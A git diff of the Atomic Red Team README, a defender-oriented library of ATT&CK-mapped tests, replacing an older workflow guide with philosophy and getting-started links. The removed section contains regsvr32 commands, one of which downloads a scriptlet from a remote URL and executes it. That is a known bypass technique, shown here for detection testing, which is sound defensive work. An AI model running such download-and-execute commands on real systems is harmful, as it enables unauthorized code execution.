@@ -1,82 +1,60 @@
+<p><img src="https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png" width="150px" /></p>
+
 # Atomic Red Team
+[![CircleCI](https://circleci.com/gh/redcanaryco/atomic-red-team.svg?style=svg)](https://circleci.com/gh/redcanaryco/atomic-red-team)
 
-Small and highly portable detection tests mapped to the [Mitre ATT&CK Framework.](https://attack.mitre.org/wiki/Main_Page)
+Atomic Red Team allows every security team to test their controls by executing simple
+"atomic tests" that exercise the same techniques used by adversaries (all mapped to 
+[Mitre's ATT&CK](https://attack.mitre.org/wiki/Main_Page)).
 
-*NOTE: We have sweet stickers for people who contribute; if you’re interested send a message to gear@redcanary.com with your mailing address*
+## Philosophy
 
-## Mitre ATT&CK Matrix
+Atomic Red Team is a library of simple tests that every security team can execute to test their controls. Tests are
+focused, have few dependencies, and are defined in a structured format that be used by automation frameworks. 
 
-We broke the repository into three working matrices:
+Three key beliefs made up the Atomic Red Team charter:
+- **Teams need to be able to test everything from specific technical controls to outcomes.**
+  Our security teams do not want to operate with a “hopes and prayers” attitude toward detection. We need to know 
+  what our controls and program can detect, and what it cannot. We don’t have to detect every adversary, but we 
+  do believe in knowing our blind spots.
 
-[Windows MITRE ATT&CK Matrix](Windows/README.md)
+- **We should be able to run a test in less than five minutes.**
+  Most security tests and automation tools take a tremendous amount of time to install, configure, and execute. 
+  We coined the term "atomic tests" because we felt there was a simple way to decompose tests so most could be 
+  run in a few minutes.
 
-[Mac MITRE ATT&CK Matrix](Mac/README.md)
+  The best test is the one you actually run.
 
-[Linux MITRE ATT&CK Matrix](Linux/README.md)
+- **We need to keep learning how adversaries are operating.**
+  Most security teams don’t have the benefit of seeing a wide variety of adversary types and techniques crossing 
+  their desk every day. Even we at Red Canary only come across a fraction of the possible techniques being used, 
+  which makes the community working together essential to making us all better.
 
-## How to use Atomic Red Team
+See: https://atomicredteam.io/philosophy
 
-Our Atomic Red Team tests are small, highly portable detection tests mapped to the MITRE ATT&CK Framework. Each test is designed to map back to a particular tactic. We hope that this gives defenders a highly actionable way to immediately start testing their defenses against a broad spectrum of attacks.
+## Having trouble?
 
-* Be sure to get permission and necessary approval before conducting tests. Unauthorized testing is a bad decision, and can potentially be a resume-generating event.
+Join the community on Slack at [https://atomicredteam.slack.com](https://atomicredteam.slack.com)
 
-* Set up a test machine that would be similar to the build in your environment. Be sure you have your collection/EDR solution in place, and that the endpoint is checking in and active.
+## Getting Started
 
-* Spend some time developing a test plan or scenario. This can take many forms. An example test plan could be to execute all the Discovery phase items at once in a batch file, or run each phase one by one, validating coverage as you go.
+* [Quick Start: Using Atomic Red Team to test your security](#quick-start-using-atomic-red-team-to-test-your-security)
+* Peruse the [Complete list of Atomic Tests](atomics/index.md) and the [ATT&CK Matrix](atomics/matrix.md)
+  - Windows [Tests](atomics/windows-index.md) and [Matrix](atomics/windows-matrix.md)
+  - macOS [Tests](atomics/macos-index.md) and [Matrix](atomics/macos-matrix.md)
+  - Linux [Tests](atomics/linux-index.md) and [Matrix](atomics/linux-matrix.md)
+* [Fork](https://github.com/redcanaryco/atomic-red-team/fork) and [Contribute](https://atomicredteam.io/contributing/) your own modifications
+* [Doing more with Atomic Red Team](#doing-more-with-atomic-red-team)
+    * [Using the Atomic Red Team Ruby API](#using-the-atomic-red-team-ruby-api)
+    * [Bonus APIs: Ruby ATT&CK API](#bonus-apis-ruby-attck-api)
+    * [Execution Frameworks](https://github.com/redcanaryco/atomic-red-team/blob/master/execution-frameworks)
+* Have questions? Join the community on Slack at [https://atomicredteam.slack.com](https://atomicredteam.slack.com)
 
-There are three phases to the testing framework:
+## Code of Conduct
 
-![Phases](https://www.redcanary.com/wp-content/uploads/image2-5.png)
+In order to have a more open and welcoming community, Atomic Red Team adheres to a
+[code of conduct](CODE_OF_CONDUCT.md).
 
-### Phase 1: Execute Test
+## License
 
-This particular test is fairly easy to exercise, since the tool is default on all Windows workstations.
-
-The details of this test case are [here](Windows/Execution/Regsvr32.md).
-
-Two methods are provided to perform the Atomic Test:
-
-#### Local
-
-For a local simulation use the provided .sct file:
-
-    regsvr32.exe /s /u /i:file.sct scrobj.dll
-
-#### Remote
-
-For a remote simulation you will need a remotely accessible server to grab/download this file, or use gist:
-
-    regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll
-
-### Phase 2: Collect Evidence
-
-What does your security solution observe? You may see a file modification in the user’s profile. You may detect network connections made by regsvr32.exe to an external IP. There may be an entry in the proxy logs. You may observe the scrobj.dll loading on Windows. Or, you might not observe any behavior on the endpoint or network. This is why we test! To identify visibility gaps and determine where improvements need to be made.
-
-![RC Timeline](https://www.redcanary.com/wp-content/uploads/image9-1.png)
-
-![Cb example 1](https://www.redcanary.com/wp-content/uploads/image5-3.png)
-
-![Cb Example 2](https://www.redcanary.com/wp-content/uploads/image7-2.png)
-
-### Phase 3: Develop Detection
-
-So you executed the test and none of your defenses fired – that’s why we test! Based on your observations and detection capabilities, it is time to use what you have to try to detect this event in your environment.
-
-![Unwind Data](https://www.redcanary.com/wp-content/uploads/image8-1.png)
-
-Once the detection is built, it is time to validate that the detection is working and that it is appropriately tuned. If you were to write your detection too broadly and “detect” every regsvr32.exe, you are going to be digging out from a mountain of false positives. But if you write it too narrow and it only detects regsvr32.exe with the exact command line “/s /u /i” then all an attacker has to do is slightly modify the command line to evade your detection.
-
-### Measure Progress
-
-One of the goals is to try to measure your coverage/capabilities against the ATT&CK Matrix and to identify where you may have gaps. Roberto Rodriguez ([@cyb3rWar0g](https://twitter.com/Cyb3rWard0g)) provided [this spreadsheet](https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/blob/master/metrics/HuntTeam_HeatMap.xlsx) and complementary [blog post](https://cyberwardog.blogspot.com/2017/07/how-hot-is-your-hunt-team.html) showcasing how to determine where you stand within your organization in relation the MITRE ATT&CK Matrix.
-
-![HeatMap](https://www.redcanary.com/wp-content/uploads/image4-5.png)
-
-![Measure](https://www.redcanary.com/wp-content/uploads/image6-2.png)
-
-
-
-
-#### We did not create the MITRE ATT&CK Framework, we just think it is awesome and extensive.
-
-#### ATT&CK and ATT&CK Matrix are trademarks of The MITRE Corporation
+See the [LICENSE](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt) file.
